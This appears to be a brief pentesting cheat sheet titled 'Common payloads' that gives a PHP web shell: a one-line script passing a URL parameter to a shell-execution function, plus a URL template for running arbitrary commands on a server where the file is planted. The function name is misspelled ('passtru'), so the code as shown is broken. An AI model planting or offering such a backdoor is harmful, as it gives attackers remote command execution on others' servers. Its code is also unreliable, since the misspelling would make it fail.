# Common payloads

## PHP RCE
```php
<?php
  passtru($_GET['KEY HERE']);
?>
```
Then, to run a command:
```
https://domain.com/filename.php?<INSERT KEY HERE>=<COMMAND>
```
